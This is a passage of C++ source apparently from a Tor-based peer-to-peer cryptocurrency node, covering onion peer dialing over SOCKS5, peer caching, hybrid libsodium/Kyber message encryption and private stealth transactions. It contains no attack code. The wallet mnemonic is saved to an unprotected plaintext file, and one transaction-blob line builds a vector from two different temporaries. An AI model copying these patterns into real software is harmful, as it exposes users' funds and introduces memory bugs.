    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) { CLOSESOCK(fd); return; }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) { CLOSESOCK(fd); return; }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) { CLOSESOCK(fd); return; }
    } else if (gresp[1] != 0x00) { CLOSESOCK(fd); return; }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)seedOnion.size());
    req.insert(req.end(), seedOnion.begin(), seedOnion.end());
    uint16_t rpcPort = 8332;
    req.push_back((rpcPort >> 8) & 0xFF);
    req.push_back(rpcPort & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    if (n < 2 || resp[1] != 0x00) { CLOSESOCK(fd); return; }

    std::string body = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"peer.announce\",\"params\":{\"onion\":\""
        + ownOnion_ + "\"}}";
    std::string httpReq = "POST / HTTP/1.1\r\nHost: " + seedOnion + ":8332\r\n"
        "Content-Type: application/json\r\nContent-Length: " + std::to_string(body.size()) + "\r\n"
        "Connection: close\r\n\r\n" + body;
    send(fd, httpReq.c_str(), httpReq.size(), 0);

    char buf[512];
    recv(fd, buf, sizeof(buf), 0);
    CLOSESOCK(fd);
}

static bool isValidV3Onion(const std::string& s) {

    const std::string suf = ".onion";
    if (s.size() != 56 + suf.size()) return false;
    if (s.compare(s.size() - suf.size(), suf.size(), suf) != 0) return false;
    for (size_t i = 0; i < 56; i++) {
        char c = s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= '2' && c <= '7'))) return false;
    }
    return true;
}

void SynapsedEngine::mergeKnownPeer(const std::string& onionRaw, const std::string& source, bool connected) const {
    std::string onion = onionHostOnly(trim(onionRaw));
    if (!isValidV3Onion(onion)) return;
    if (!ownOnion_.empty() && onion == onionHostOnly(ownOnion_)) return;
    std::lock_guard<std::mutex> lock(knownPeersMtx_);
    auto& kp = knownPeers_[onion];
    kp.onion = onion;
    kp.lastSeen = nowMillis();
    if (kp.firstSeen == 0) kp.firstSeen = kp.lastSeen;

    if (kp.source.empty() || source == "pex" || source == "inbound") kp.source = source;
    if (connected) kp.connected = true;
}

void SynapsedEngine::loadLocalProfile() const {
    profileAlias_.clear();
    profileAvatarDataUrl_.clear();
    profileAvatarMesh_.clear();
    std::ifstream sf(dataDir_ + "/settings.json");
    if (sf.good()) {
        std::string content((std::istreambuf_iterator<char>(sf)),
                             std::istreambuf_iterator<char>());
        nlohmann::json j = nlohmann::json::parse(content, nullptr, false);
        if (!j.is_discarded() && j.is_object()) {
            if (j.contains("profile_alias") && j["profile_alias"].is_string())
                profileAlias_ = j["profile_alias"].get<std::string>();
            if (j.contains("profile_avatar") && j["profile_avatar"].is_string())
                profileAvatarDataUrl_ = j["profile_avatar"].get<std::string>();
            if (j.contains("profile_avatar_mesh") && j["profile_avatar_mesh"].is_string())
                profileAvatarMesh_ = j["profile_avatar_mesh"].get<std::string>();
        }
    }
    if (profileAvatarDataUrl_.empty())
        profileAvatarDataUrl_ = fileToDataUrl(dataDir_ + "/avatar.png", "image/png");
    if (profileAvatarMesh_.empty())
        profileAvatarMesh_ = fileToDataUrl(dataDir_ + "/avatar_mesh.jpg", "image/jpeg");
}

void SynapsedEngine::ensureMsgBoxKeys() const {
    if (msgBoxReady_) return;
    if (sodium_init() < 0) return;
    const std::string path = dataDir_ + "/msgbox.key";
    std::ifstream in(path);
    std::string skHex, pkHex;
    if (in) std::getline(in, skHex);
    if (in) std::getline(in, pkHex);
    skHex = trim(skHex);
    pkHex = trim(pkHex);
    if (isHex64(skHex) && isHex64(pkHex) &&
        sodium_hex2bin(msgBoxSk_.data(), 32, skHex.c_str(), skHex.size(), nullptr, nullptr, nullptr) == 0 &&
        sodium_hex2bin(msgBoxPk_.data(), 32, pkHex.c_str(), pkHex.size(), nullptr, nullptr, nullptr) == 0) {
        msgBoxReady_ = true;
        return;
    }
    crypto_box_keypair(msgBoxPk_.data(), msgBoxSk_.data());
    char skOut[65];
    char pkOut[65];
    sodium_bin2hex(skOut, sizeof(skOut), msgBoxSk_.data(), 32);
    sodium_bin2hex(pkOut, sizeof(pkOut), msgBoxPk_.data(), 32);
    std::ofstream out(path, std::ios::trunc);
    if (out) {
        out << skOut << "\n" << pkOut << "\n";
        out.close();
#ifndef _WIN32
        chmod(path.c_str(), S_IRUSR | S_IWUSR);
#endif
    }
    msgBoxReady_ = true;
}

static bool isHexLen(const std::string& s, size_t n) {
    if (s.size() != n) return false;
    for (char c : s) {
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
            return false;
    }
    return true;
}

static constexpr const char kMsgKemLabel[] = "synapse-node-msg-v3";

static std::array<uint8_t, 32> msgKemWrapKey(const std::vector<uint8_t>& ss) {
    std::vector<uint8_t> kdfIn = ss;
    kdfIn.insert(kdfIn.end(), kMsgKemLabel, kMsgKemLabel + 19);
    return synapse::crypto::sha256(kdfIn);
}

void SynapsedEngine::ensureKemKeys() const {
    if (msgKemReady_) return;
    if (!synapse::quantum::getPQCBackendStatus().kyberReal) return;
    const std::string path = dataDir_ + "/msgkem.key";
    std::ifstream in(path);
    std::string skHex, pkHex;
    if (in) std::getline(in, skHex);
    if (in) std::getline(in, pkHex);
    skHex = trim(skHex);
    pkHex = trim(pkHex);
    const size_t pkHexN = synapse::quantum::KYBER_PUBLIC_KEY_SIZE * 2;
    const size_t skHexN = synapse::quantum::KYBER_SECRET_KEY_SIZE * 2;
    if (isHexLen(skHex, skHexN) && isHexLen(pkHex, pkHexN)) {
        auto sk = synapse::crypto::fromHex(skHex);
        auto pk = synapse::crypto::fromHex(pkHex);
        if (sk.size() == synapse::quantum::KYBER_SECRET_KEY_SIZE &&
            pk.size() == synapse::quantum::KYBER_PUBLIC_KEY_SIZE) {
            msgKemSk_ = std::move(sk);
            msgKemPk_ = std::move(pk);
            msgKemReady_ = true;
            return;
        }
    }
    synapse::quantum::Kyber kyber;
    auto kp = kyber.generateKeyPair();
    if (!kyber.validatePublicKey(kp.publicKey) || !kyber.validateSecretKey(kp.secretKey))
        return;
    msgKemPk_.assign(kp.publicKey.begin(), kp.publicKey.end());
    msgKemSk_.assign(kp.secretKey.begin(), kp.secretKey.end());
    std::ofstream out(path, std::ios::trunc);
    if (out) {
        out << synapse::crypto::toHex(msgKemSk_) << "\n"
            << synapse::crypto::toHex(msgKemPk_) << "\n";
        out.close();
#ifndef _WIN32
        chmod(path.c_str(), S_IRUSR | S_IWUSR);
#endif
    }
    msgKemReady_ = true;
}

std::string SynapsedEngine::peerBoxPk(const std::string& onion) const {
    const std::string host = onionHostOnly(onion);
    std::lock_guard<std::mutex> lock(knownPeersMtx_);
    auto it = knownPeers_.find(host);
    if (it == knownPeers_.end()) return "";
    return it->second.boxPk;
}

std::string SynapsedEngine::peerKemPk(const std::string& onion) const {
    const std::string host = onionHostOnly(onion);
    std::lock_guard<std::mutex> lock(knownPeersMtx_);
    auto it = knownPeers_.find(host);
    if (it == knownPeers_.end()) return "";
    return it->second.kemPk;
}

bool SynapsedEngine::sealToPeer(const std::string& peerPkHex, const std::string& plaintext, std::string& sealedB64) const {
    sealedB64.clear();
    if (!isHex64(peerPkHex)) return false;
    unsigned char pk[32];
    if (sodium_hex2bin(pk, 32, peerPkHex.c_str(), peerPkHex.size(), nullptr, nullptr, nullptr) != 0)
        return false;
    std::vector<unsigned char> ct(plaintext.size() + crypto_box_SEALBYTES);
    if (crypto_box_seal(ct.data(),
                        reinterpret_cast<const unsigned char*>(plaintext.data()),
                        plaintext.size(), pk) != 0)
        return false;
    auto enc = synapse::crypto::base64Encode(std::vector<uint8_t>(ct.begin(), ct.end()));
    sealedB64.assign(enc.begin(), enc.end());
    return !sealedB64.empty();
}

bool SynapsedEngine::openSealedMsg(const std::string& sealedB64, std::string& plaintext) const {
    plaintext.clear();
    ensureMsgBoxKeys();
    std::vector<uint8_t> raw = synapse::crypto::base64Decode(
        std::vector<uint8_t>(sealedB64.begin(), sealedB64.end()));
    if (raw.size() < crypto_box_SEALBYTES) return false;
    std::vector<unsigned char> pt(raw.size() - crypto_box_SEALBYTES);
    if (crypto_box_seal_open(pt.data(), raw.data(), raw.size(), msgBoxPk_.data(), msgBoxSk_.data()) != 0)
        return false;
    plaintext.assign(reinterpret_cast<char*>(pt.data()), pt.size());
    return true;
}

bool SynapsedEngine::wrapSealHybrid(const std::string& peerKemPkHex, const std::string& sealedB64,
                                   std::string& kemCtB64, std::string& wrappedSealB64) const {
    // ML-KEM-768 encaps, then XSalsa20-Poly1305 of the existing crypto_box_seal blob.
    kemCtB64.clear();
    wrappedSealB64.clear();
    if (!synapse::quantum::getPQCBackendStatus().kyberReal) return false;
    if (sodium_init() < 0) return false;
    if (!isHexLen(peerKemPkHex, synapse::quantum::KYBER_PUBLIC_KEY_SIZE * 2)) return false;
    auto pkRaw = synapse::crypto::fromHex(peerKemPkHex);
    if (pkRaw.size() != synapse::quantum::KYBER_PUBLIC_KEY_SIZE) return false;
    synapse::quantum::KyberPublicKey pk{};
    std::memcpy(pk.data(), pkRaw.data(), pkRaw.size());
    synapse::quantum::Kyber kyber;
    auto enc = kyber.encapsulate(pk);
    if (!enc.success || enc.ciphertext.size() != synapse::quantum::KYBER_CIPHERTEXT_SIZE ||
        enc.sharedSecret.size() != synapse::quantum::KYBER_SHARED_SECRET_SIZE)
        return false;
    std::vector<uint8_t> sealed = synapse::crypto::base64Decode(
        std::vector<uint8_t>(sealedB64.begin(), sealedB64.end()));
    if (sealed.empty()) return false;
    auto keyHash = msgKemWrapKey(enc.sharedSecret);
    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    randombytes_buf(nonce, sizeof(nonce));
    std::vector<unsigned char> wrapped(crypto_secretbox_NONCEBYTES + sealed.size() +
                                       crypto_secretbox_MACBYTES);
    std::memcpy(wrapped.data(), nonce, crypto_secretbox_NONCEBYTES);
    if (crypto_secretbox_easy(wrapped.data() + crypto_secretbox_NONCEBYTES,
                              sealed.data(), sealed.size(), nonce, keyHash.data()) != 0) {
        sodium_memzero(enc.sharedSecret.data(), enc.sharedSecret.size());
        return false;
    }
    sodium_memzero(enc.sharedSecret.data(), enc.sharedSecret.size());
    auto kemEnc = synapse::crypto::base64Encode(enc.ciphertext);
    auto wrapEnc = synapse::crypto::base64Encode(std::vector<uint8_t>(wrapped.begin(), wrapped.end()));
    kemCtB64.assign(kemEnc.begin(), kemEnc.end());
    wrappedSealB64.assign(wrapEnc.begin(), wrapEnc.end());
    return !kemCtB64.empty() && !wrappedSealB64.empty();
}

bool SynapsedEngine::unwrapSealHybrid(const std::string& kemCtB64, const std::string& wrappedSealB64,
                                     std::string& sealedB64) const {
    sealedB64.clear();
    ensureKemKeys();
    if (!msgKemReady_ || msgKemSk_.size() != synapse::quantum::KYBER_SECRET_KEY_SIZE)
        return false;
    std::vector<uint8_t> ct = synapse::crypto::base64Decode(
        std::vector<uint8_t>(kemCtB64.begin(), kemCtB64.end()));
    if (ct.size() != synapse::quantum::KYBER_CIPHERTEXT_SIZE) return false;
    synapse::quantum::KyberCiphertext kct{};
    std::memcpy(kct.data(), ct.data(), ct.size());
    synapse::quantum::KyberSecretKey sk{};
    std::memcpy(sk.data(), msgKemSk_.data(), msgKemSk_.size());
    synapse::quantum::Kyber kyber;
    auto ss = kyber.decapsulate(kct, sk);
    if (ss.size() != synapse::quantum::KYBER_SHARED_SECRET_SIZE) return false;
    std::vector<uint8_t> wrapped = synapse::crypto::base64Decode(
        std::vector<uint8_t>(wrappedSealB64.begin(), wrappedSealB64.end()));
    if (wrapped.size() < crypto_secretbox_NONCEBYTES + crypto_secretbox_MACBYTES) {
        sodium_memzero(ss.data(), ss.size());
        return false;
    }
    auto keyHash = msgKemWrapKey(ss);
    sodium_memzero(ss.data(), ss.size());
    const unsigned char* nonce = wrapped.data();
    const unsigned char* box = wrapped.data() + crypto_secretbox_NONCEBYTES;
    const size_t clen = wrapped.size() - crypto_secretbox_NONCEBYTES;
    std::vector<unsigned char> sealed(clen - crypto_secretbox_MACBYTES);
    if (crypto_secretbox_open_easy(sealed.data(), box, clen, nonce, keyHash.data()) != 0)
        return false;
    auto enc = synapse::crypto::base64Encode(std::vector<uint8_t>(sealed.begin(), sealed.end()));
    sealedB64.assign(enc.begin(), enc.end());
    return !sealedB64.empty();
}

std::string SynapsedEngine::localProfileLine() const {
    ensureMsgBoxKeys();
    ensureKemKeys();
    nlohmann::json j;
    j["v"] = 1;
    j["onion"] = ownOnion_;
    j["alias"] = profileAlias_;
    j["avatar"] = profileAvatarMesh_;
    char pkHex[65];
    sodium_bin2hex(pkHex, sizeof(pkHex), msgBoxPk_.data(), 32);
    j["box_pk"] = pkHex;
    if (msgKemReady_ && msgKemPk_.size() == synapse::quantum::KYBER_PUBLIC_KEY_SIZE)
        j["kem_pk"] = synapse::crypto::toHex(msgKemPk_);
    return "NODE_PROFILE " + j.dump() + "\n";
}

void SynapsedEngine::ingestNodeProfile(const std::string& jsonBody) const {
    nlohmann::json j = nlohmann::json::parse(jsonBody, nullptr, false);
    if (j.is_discarded() || !j.is_object()) return;
    std::string onion = onionHostOnly(j.value("onion", ""));
    if (!isValidV3Onion(onion) || (!ownOnion_.empty() && onion == onionHostOnly(ownOnion_))) return;
    std::string alias = j.value("alias", "");
    if (alias.size() > 32) alias = alias.substr(0, 32);
    std::string avatar = j.value("avatar", "");
    if (avatar.size() > 80000) avatar.clear();
    if (!avatar.empty() && avatar.rfind("data:image/", 0) != 0) avatar.clear();
    std::string boxPk = j.value("box_pk", "");
    if (!isHex64(boxPk)) boxPk.clear();
    std::string kemPk = j.value("kem_pk", "");
    if (!isHexLen(kemPk, synapse::quantum::KYBER_PUBLIC_KEY_SIZE * 2)) kemPk.clear();
    mergeKnownPeer(onion, "profile", false);
    std::lock_guard<std::mutex> lock(knownPeersMtx_);
    auto it = knownPeers_.find(onion);
    if (it == knownPeers_.end()) return;
    if (!alias.empty()) it->second.alias = alias;
    if (!avatar.empty()) it->second.avatar = avatar;
    if (!boxPk.empty()) it->second.boxPk = boxPk;
    if (!kemPk.empty()) it->second.kemPk = kemPk;
}

void SynapsedEngine::pushLocalProfile(const std::string& onion) const {
    if (!isValidV3Onion(onion) || (!ownOnion_.empty() && onion == onionHostOnly(ownOnion_))) return;
    loadLocalProfile();
    ensureMsgBoxKeys();
    sendOnionPayload(onion, 8333, localProfileLine(), nullptr);
}

std::vector<std::string> SynapsedEngine::dialPeer(const std::string& onion) {
    std::vector<std::string> learned;
    if (onion.empty() || onion == ownOnion_ || onion.find(".onion") == std::string::npos) return learned;

    auto t0 = std::chrono::steady_clock::now();
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return learned;
    struct timeval tv{20, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) { CLOSESOCK(fd); return learned; }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) { CLOSESOCK(fd); return learned; }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) { CLOSESOCK(fd); return learned; }
    } else if (gresp[1] != 0x00) { CLOSESOCK(fd); return learned; }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)onion.size());
    req.insert(req.end(), onion.begin(), onion.end());
    uint16_t p2pPort = 8333;
    req.push_back((p2pPort >> 8) & 0xFF);
    req.push_back(p2pPort & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    if (n < 2 || resp[1] != 0x00) { CLOSESOCK(fd); return learned; }

    std::string msg = "GET_PEERS " + ownOnion_ + "\n";
    send(fd, msg.c_str(), msg.size(), 0);

    std::string response;
    char buf[4096];
    ssize_t r = recv(fd, buf, sizeof(buf) - 1, 0);
    if (r > 0) { buf[r] = '\0'; response = buf; }
    CLOSESOCK(fd);

    mergeKnownPeer(onion, "pex", true);
    {
        auto t1 = std::chrono::steady_clock::now();
        int rtt = (int)std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
        if (rtt < 1) rtt = 1;
        std::lock_guard<std::mutex> lock(knownPeersMtx_);
        auto it = knownPeers_.find(onion);
        if (it != knownPeers_.end()) it->second.latency_ms = rtt;
    }
    std::thread([this, onion]() { pushLocalProfile(onion); }).detach();

    if (response.find("PEERS") == 0) {
        std::istringstream iss(response.substr(5));
        std::string tok;
        while (iss >> tok) {
            tok = onionHostOnly(tok);
            if (tok.find(".onion") == std::string::npos) continue;
            if (!ownOnion_.empty() && tok == onionHostOnly(ownOnion_)) continue;
            learned.push_back(tok);
            mergeKnownPeer(tok, "pex", false);
        }
    }
    return learned;
}

void SynapsedEngine::loadPeerCache() const {
    std::ifstream f(dataDir_ + "/peers.dat");
    if (!f.good()) return;
    std::string line;
    std::lock_guard<std::mutex> lock(knownPeersMtx_);
    while (std::getline(f, line)) {
        if (line.empty()) continue;
        std::istringstream iss(line);
        std::string onion; int64_t ls = 0;
        iss >> onion >> ls;
        if (!isValidV3Onion(onion)) continue;
        if (onion == ownOnion_) continue;
        KnownPeer kp;
        kp.onion = onion;
        kp.lastSeen = ls;
        kp.firstSeen = ls;
        kp.source = "cache";
        kp.connected = false;
        knownPeers_[onion] = kp;
    }
}

void SynapsedEngine::savePeerCache() const {
    std::vector<std::pair<std::string, int64_t>> entries;
    {
        std::lock_guard<std::mutex> lock(knownPeersMtx_);
        for (const auto& kv : knownPeers_) entries.push_back({kv.first, kv.second.lastSeen});
    }

    std::sort(entries.begin(), entries.end(),
              [](const auto& a, const auto& b) { return a.second > b.second; });
    if (entries.size() > 500) entries.resize(500);
    std::string tmp = dataDir_ + "/peers.dat.tmp";
    std::ofstream f(tmp, std::ios::trunc);
    if (!f.good()) return;
    for (const auto& e : entries) f << e.first << " " << e.second << "\n";
    f.close();
    std::rename(tmp.c_str(), (dataDir_ + "/peers.dat").c_str());
}

void SynapsedEngine::ensureStealthWallet() {
    if (!privacy_ || walletMnemonic_.empty()) return;
    privacy::stealthKeysFromMnemonic(walletMnemonic_, privacy_->stealth());
}

void SynapsedEngine::compactLocalPoeChain() {
    std::error_code ec;
    std::filesystem::remove(dataDir_ + "/naan_blocks.jsonl", ec);

    std::ifstream in(dataDir_ + "/blocks.jsonl");
    std::vector<nlohmann::json> keep;
    std::string line;
    while (in && std::getline(in, line)) {
        if (line.empty()) continue;
        nlohmann::json j = nlohmann::json::parse(line, nullptr, false);
        if (j.is_discarded() || !j.is_object()) continue;
        std::string t;
        if (j.contains("events_detail") && j["events_detail"].is_array() &&
            !j["events_detail"].empty() && j["events_detail"][0].is_object()) {
            t = j["events_detail"][0].value("type", "");
        }
        if (t == "fetch_failed" || t == "draft" || t == "rejected" || t == "accepted")
            continue;
        keep.push_back(std::move(j));
    }
    in.close();

    const std::string path = dataDir_ + "/blocks.jsonl";
    const std::string tmp = path + ".tmp";
    std::ofstream out(tmp, std::ios::trunc);
    std::string prev(64, '0');
    uint64_t height = 0;
    for (auto& j : keep) {
        height += 1;
        j["height"] = height;
        j["prev_hash"] = prev;
        if (j.contains("hash") && j["hash"].is_string() && !j["hash"].get<std::string>().empty())
            prev = j["hash"].get<std::string>();
        out << j.dump() << "\n";
    }
    out.close();
    std::filesystem::rename(tmp, path, ec);
    lastBlockHeight_ = height;
    naanSubmissions_ = 0;
}

std::string SynapsedEngine::stealthReceiveAddress() const {
    if (!privacy_ || !privacy_->stealth().hasKeys()) return "";
    return privacy_->stealth().encodeAddress();
}

void SynapsedEngine::loadMigratePrivateWallet() const {
    std::lock_guard<std::mutex> lock(privateWalletMtx_);
    auto wallet = loadOwnedOutputs(dataDir_);

    // Keep outputs that appear in a broadcast/received RingCT tx. Drop NAAN
    // test-mints that were written straight into private_utxo.jsonl.
    std::set<std::string> anchored;
    if (privacy_ && privacy_->stealth().hasKeys()) {
        std::ifstream pf(dataDir_ + "/private_pub.jsonl");
        std::string line;
        while (pf.good() && std::getline(pf, line)) {
            if (line.empty()) continue;
            nlohmann::json j = nlohmann::json::parse(line, nullptr, false);
            if (j.is_discarded()) continue;
            synapse::privacy::PrivateTx tx;
            std::string err;
            if (!jsonToPrivateTx(j, tx, err)) continue;
            for (const auto& outp : tx.vouts) {
                synapse::privacy::OwnedOutput owned;
                if (!synapse::privacy::scanOutput(privacy_->stealth(), outp, owned)) continue;
                anchored.insert(synapse::crypto::toHex(owned.oneTime));
            }
        }
    }
    std::vector<synapse::privacy::OwnedOutput> kept;
    kept.reserve(wallet.size());
    for (const auto& o : wallet) {
        if (anchored.count(synapse::crypto::toHex(o.oneTime))) kept.push_back(o);
    }
    if (kept.size() != wallet.size()) {
        saveOwnedOutputs(dataDir_, kept);
        wallet.swap(kept);
    }

    uint64_t unspent = 0;
    for (const auto& o : wallet) {
        if (!o.spent) unspent += o.amountAtoms;
    }
    naanTotalNgt_ = atomsToNgt(unspent);
    std::ostringstream bs;
    bs << std::fixed << std::setprecision(2) << naanTotalNgt_;
    balance_ = bs.str();
    std::ofstream bf(dataDir_ + "/balance.dat", std::ios::trunc);
    if (bf.good()) bf << balance_;
}

std::string SynapsedEngine::sendPrivateNgt(const std::string& recipient, double amt, const std::string& memo) {
    if (connectionType_ != "tor")
        return "{\"error\":\"TOR REQUIRED\"}";
    if (!privacy_ || !privacy_->stealth().hasKeys())
        return "{\"error\":\"stealth wallet not ready\"}";
    uint64_t atoms = ngtToAtoms(amt);
    if (atoms == 0) return "{\"error\":\"invalid amount\"}";

    nlohmann::json pub;
    std::string line;
    {
        std::lock_guard<std::mutex> lock(privateWalletMtx_);
        auto wallet = loadOwnedOutputs(dataDir_);
        auto decoys = loadDecoyPool(dataDir_);
        synapse::privacy::PrivateSendResult built;
        std::string err;
        if (!synapse::privacy::buildPrivateSend(privacy_->stealth(), recipient, atoms,
                                                wallet, decoys, built, err)) {
            return std::string("{\"error\":\"") + jsonEscape(err) + "\"}";
        }
        built.tx.ts = nowMillis();
        std::string vErr;
        if (!synapse::privacy::verifyPrivateTx(built.tx, vErr)) {
            return std::string("{\"error\":\"") + jsonEscape(vErr) + "\"}";
        }
        synapse::crypto::RingSign::saveKeyImages(dataDir_ + "/key_images.dat");

        std::set<std::string> have;
        for (const auto& o : wallet) have.insert(synapse::crypto::toHex(o.oneTime));
        for (const auto& outp : built.tx.vouts) {
            synapse::privacy::OwnedOutput owned;
            if (!synapse::privacy::scanOutput(privacy_->stealth(), outp, owned)) continue;
            std::string phex = synapse::crypto::toHex(owned.oneTime);
            if (have.count(phex)) continue;
            have.insert(phex);
            wallet.push_back(owned);
        }

        saveOwnedOutputs(dataDir_, wallet);

        uint64_t unspent = 0;
        for (const auto& o : wallet) {
            if (!o.spent) unspent += o.amountAtoms;
        }
        naanTotalNgt_ = atomsToNgt(unspent);
        std::ostringstream bs;
        bs << std::fixed << std::setprecision(2) << naanTotalNgt_;
        balance_ = bs.str();
        {
            std::ofstream bf(dataDir_ + "/balance.dat", std::ios::trunc);
            if (bf.good()) bf << balance_;
        }

        pub = privateTxToJson(built.tx);
        appendPublicTx(dataDir_, pub);

        nlohmann::json note;
        note["txid"] = pub["txid"];
        note["type"] = "sent";
        note["amount"] = amt;
        note["to"] = recipient;
        note["ts"] = built.tx.ts;
        note["status"] = "broadcast";
        if (!memo.empty()) note["memo"] = memo;
        appendWalletNote(dataDir_, note);

        if (privacy_) {
            std::vector<uint8_t> blob(pub.dump().begin(), pub.dump().end());
            std::vector<std::string> peers;
            {
                std::lock_guard<std::mutex> plock(knownPeersMtx_);
                for (const auto& kv : knownPeers_) peers.push_back(kv.first);
            }
            privacy_->dandelion().submitTransaction(pub["txid"].get<std::string>(), blob, peers);
        }
        line = pub.dump();
    }

    relayPrivateTxJson(line);

    nlohmann::json out;
    out["ok"] = true;
    out["txid"] = pub["txid"];
    out["privacy"] = "stealth_ring11_ringct";
    return out.dump();
}

void SynapsedEngine::ingestPrivateTxJson(const std::string& jsonLine) const {
    nlohmann::json j = nlohmann::json::parse(jsonLine, nullptr, false);
    if (j.is_discarded()) return;
    synapse::privacy::PrivateTx tx;
    std::string err;
    if (!jsonToPrivateTx(j, tx, err)) return;
    if (!synapse::privacy::verifyPrivateTx(tx, err)) return;

    std::string txidHex = synapse::crypto::toHex(tx.txid);
    std::lock_guard<std::mutex> lock(privateWalletMtx_);
    if (publicTxSeen(dataDir_, txidHex)) return;

    for (const auto& vin : tx.vins) {
        if (synapse::crypto::RingSign::isDoubleSpend(vin.sig.keyImage)) return;
    }
    for (const auto& vin : tx.vins) {
        synapse::crypto::RingSign::recordKeyImage(vin.sig.keyImage);
    }
    synapse::crypto::RingSign::saveKeyImages(dataDir_ + "/key_images.dat");
    appendPublicTx(dataDir_, j);

    if (!privacy_ || !privacy_->stealth().hasKeys()) return;
    auto wallet = loadOwnedOutputs(dataDir_);
    std::set<std::string> have;
    for (const auto& o : wallet) have.insert(synapse::crypto::toHex(o.oneTime));

    uint64_t credited = 0;
    for (const auto& outp : tx.vouts) {
        synapse::privacy::OwnedOutput owned;
        if (!synapse::privacy::scanOutput(privacy_->stealth(), outp, owned)) continue;
        std::string phex = synapse::crypto::toHex(owned.oneTime);
        if (have.count(phex)) continue;
        have.insert(phex);
        wallet.push_back(owned);
        credited += owned.amountAtoms;
        nlohmann::json note;
        note["txid"] = txidHex;
        note["type"] = "received";
        note["amount"] = atomsToNgt(owned.amountAtoms);
        note["ts"] = tx.ts;
        note["status"] = "confirmed";
        appendWalletNote(dataDir_, note);
    }
    if (credited > 0) {
        saveOwnedOutputs(dataDir_, wallet);
        uint64_t unspent = 0;
        for (const auto& o : wallet) {
            if (!o.spent) unspent += o.amountAtoms;
        }
        naanTotalNgt_ = atomsToNgt(unspent);
        std::ostringstream bs;
        bs << std::fixed << std::setprecision(2) << naanTotalNgt_;
        balance_ = bs.str();
        std::ofstream bf(dataDir_ + "/balance.dat", std::ios::trunc);
        if (bf.good()) bf << balance_;
    }
}

void SynapsedEngine::relayPrivateTxJson(const std::string& jsonLine) const {
    std::vector<std::string> peers;
    {
        std::lock_guard<std::mutex> lock(knownPeersMtx_);
        for (const auto& kv : knownPeers_) {
            if (kv.first != ownOnion_) peers.push_back(kv.first);
        }
    }
    if (peers.empty()) return;
    unsigned char rb[4];
    randombytes_buf(rb, sizeof(rb));
    uint32_t r = static_cast<uint32_t>(rb[0]) | (static_cast<uint32_t>(rb[1]) << 8) |
                 (static_cast<uint32_t>(rb[2]) << 16) | (static_cast<uint32_t>(rb[3]) << 24);
    const std::string& dest = peers[r % peers.size()];
    std::string payload = "RELAY_TX " + jsonLine + "\n";
    sendOnionPayload(dest, 8333, payload, nullptr);
}

int SynapsedEngine::init(const std::string& configPath) {
    std::lock_guard<std::mutex> lock(mtx_);
    if (initialized_) return -1;

    configPath_ = configPath;
    nodeId_ = generateNodeId();
    startTime_ = nowMillis();
    peerCount_ = 0;

    const char* home = std::getenv("HOME");
    dataDir_ = home ? std::string(home) + "/.synapsenet" : "/tmp/.synapsenet";
    loadNaanWebConfig();
    compactLocalPoeChain();

    {
        std::string walletPath = dataDir_ + "/wallet.key";
        std::string mnemonicPath = dataDir_ + "/wallet.mnemonic";
        crypto::Keys keys;
        std::ifstream wf(walletPath);
        if (wf.good()) {
            wf.close();
            keys.load(walletPath, "");
            std::ifstream mf(mnemonicPath);
            if (mf.good()) std::getline(mf, walletMnemonic_);
            if (!walletMnemonic_.empty()) {
                keys.fromMnemonic(walletMnemonic_);
            }
        }
        if (!keys.isValid()) {
            keys.generate();
            walletMnemonic_ = keys.generateMnemonic(24);
            keys.fromMnemonic(walletMnemonic_);
            keys.save(walletPath, "");
            std::ofstream mf(mnemonicPath, std::ios::trunc);
            if (mf.good()) mf << walletMnemonic_;
        } else if (walletMnemonic_.empty()) {
            walletMnemonic_ = keys.generateMnemonic(24);
            keys.fromMnemonic(walletMnemonic_);
            keys.save(walletPath, "");
            std::ofstream mf(mnemonicPath, std::ios::trunc);
            if (mf.good()) mf << walletMnemonic_;
        }
        walletAddress_ = keys.getAddress();
    }

    {
        std::ifstream bf(dataDir_ + "/balance.dat");
        if (bf.good()) {
            std::getline(bf, balance_);
            if (!balance_.empty()) {
                naanTotalNgt_ = std::atof(balance_.c_str());
            }
        }
    }

    {
        std::string modelsDir = dataDir_ + "/models";
        DIR* dir = opendir(modelsDir.c_str());
        if (dir) {
            std::string bestPath;
            size_t bestSize = 0;
            struct dirent* ent;
